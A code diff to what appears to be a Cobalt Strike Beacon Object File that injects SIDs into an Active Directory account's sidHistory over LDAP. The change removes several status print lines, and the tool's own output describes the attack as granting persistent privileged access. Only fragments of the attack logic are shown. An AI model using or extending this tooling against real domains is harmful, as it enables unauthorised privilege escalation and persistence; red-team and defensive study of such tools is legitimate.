@@ -206,8 +206,6 @@ void go(char *args, int alen) {
     BeaconPrintf(CALLBACK_OUTPUT, "[!]   - Provides persistent privileged access");
     BeaconPrintf(CALLBACK_OUTPUT, "");
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting SID History injection");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: %s %s", targetIdentifier, isTargetDN ? "(DN)" : "(name)");
     BeaconPrintf(CALLBACK_OUTPUT, "[*] SID source: %s", sidSource);
     
     // Initialize LDAP connection
@@ -239,7 +237,6 @@ void go(char *args, int alen) {
         if (targetDN) {
             MSVCRT$strcpy(targetDN, targetIdentifier);
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Using provided target DN");
     } else {
         
         char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
@@ -254,7 +251,6 @@ void go(char *args, int alen) {
         }
     }
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Target DN: %s", targetDN);
     BeaconPrintf(CALLBACK_OUTPUT, "");
     
     // Display current state
@@ -310,11 +306,9 @@ void go(char *args, int alen) {
             goto cleanup;
         }
         
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] SID to add: %s", sidSource);
         
     } else {
         // Resolve SID from object (DN or username)
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Resolving SID from object...");
         
         char* sourceDN = NULL;
         
@@ -351,7 +345,6 @@ void go(char *args, int alen) {
         // Convert to string for display
         sidString = SidToString((PSID)sidToAdd->bv_val);
         if (sidString) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] SID to add: %s", sidString);
         }
     }
     
@@ -373,7 +366,6 @@ void go(char *args, int alen) {
     if (result == LDAP_SUCCESS) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added SID to sidHistory!");
         BeaconPrintf(CALLBACK_OUTPUT, "");
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Target: %s", targetDN);
         if (sidString) {
             BeaconPrintf(CALLBACK_OUTPUT, "[+] Added SID: %s", sidString);
         }
@@ -428,5 +420,4 @@ cleanup:
     CleanupLDAP(ld);
     
     BeaconPrintf(CALLBACK_OUTPUT, "");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Operation complete");
 }
